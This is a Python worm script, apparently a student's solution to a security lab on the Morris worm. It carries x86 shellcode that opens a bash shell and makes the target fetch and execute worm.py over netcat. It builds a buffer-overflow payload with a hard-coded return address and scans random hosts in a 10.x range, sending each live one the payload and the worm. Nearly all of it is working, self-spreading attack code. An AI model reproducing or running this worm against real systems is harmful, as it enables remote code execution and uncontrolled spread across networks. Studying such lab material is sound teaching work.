#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint
from random import random
import socket

return_offset = 10
port = 12240                # Reserve a port for your service.

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   
   #" echo 'Shellcode(^_^)'; (netstat -tulpn | grep -q 12345) || "
   #" ( test -f worm.py || nc -lnv 8080 > worm.py;               "
   #" chmod +x worm.py; ./worm.py)   			       *"
   #"123456789012345678901234567890123456789012345678901234567890"
   
   " echo '(^_^)'; (netstat -tulpn | grep -q 12240) ||          "
   " (test -f worm.py || nc -lnv 8080 > worm.py;                "
   " chmod +x worm.py; ./worm.py;)                             *"    #  get worm and run worm
   
   #" echo '(^_^)'; test -f worm.py || nc -lnv 8080 > worm.py;   "
   #" (netstat -tulpn | grep -q 12345) || (chmod +x worm.py;     "
   #" ./worm.py;)                                               *"    #  get worm and run worm

   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')

#(netstat -tulpnt | grep -q 12345) || ( test -f worm.py || nc -lnv 8080 > worm.py; echo baal; echo baal2)


# Create the badfile (the malicious payload)
def checkOwnVM():
    sock = socket.socket() 
    host_name = socket.gethostname()
    return host_name

def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 + return_offset  # Need to change
   offset = 112 + 4 # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
    result = -1
    while result == -1 :
        X = randint(151, 155)
        Y = randint(70,80)
        rand_ip = '10.'+str(X)+'.0.'+str(Y)
        try:
            self_ip = subprocess.check_output(f"hostname -I",shell=True,stderr=subprocess.STDOUT)
            get_self_ip = str(self_ip.decode("utf-8")).split(" ")[:-1]
            check_self_ip = 0
            for i in get_self_ip:
                if i == rand_ip:
                    check_self_ip = 1
                    break
            if check_self_ip == 1:
                continue
        except subprocess.CalledProcessError as e:
            continue

        try:
            output = subprocess.check_output(f"ping -q -c1 -W1 {rand_ip}", shell=True,stderr=subprocess.STDOUT)
            res = output.find(b'1 received')
            print(res)
            print(rand_ip)
            if res == -1:
                print(f"{rand_ip} is not alive", flush=True)
            else:
                result = 1
                print(f"***{rand_ip} is alive, launch the attack", flush=True)
                return rand_ip
        except subprocess.CalledProcessError as e:
            print(f"{rand_ip} - Exception occured")
    return 'null'
   


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
sock = socket.socket() 
# own_skt = checkOwnVM(sock)
print(checkOwnVM())
#task 4

sock.bind((checkOwnVM(), port))        # Bind to the port

sock.listen(5)
while True:
    targetIP = getNextTarget()
    

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(3)
    subprocess.run([f"cat worm.py | nc -w5 {targetIP} 8080"], shell=True)
    


    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    if checkOwnVM() =="VM":
        exit(0)
    #exit(0)